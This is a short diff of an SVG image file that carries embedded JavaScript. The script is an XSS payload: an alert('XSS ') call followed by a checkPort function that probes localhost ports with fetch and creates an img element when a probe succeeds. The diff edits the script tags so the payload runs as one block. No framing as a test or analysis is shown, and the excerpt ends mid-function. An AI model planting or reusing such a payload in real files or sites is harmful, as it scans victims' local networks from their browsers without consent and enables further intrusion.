@@ -5,9 +5,9 @@
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
     alert("XSS ");
-  </script>
+  
       
-    <script>
+    
     const checkPort = (port) => {
     fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
         let img = document.createElement("img");
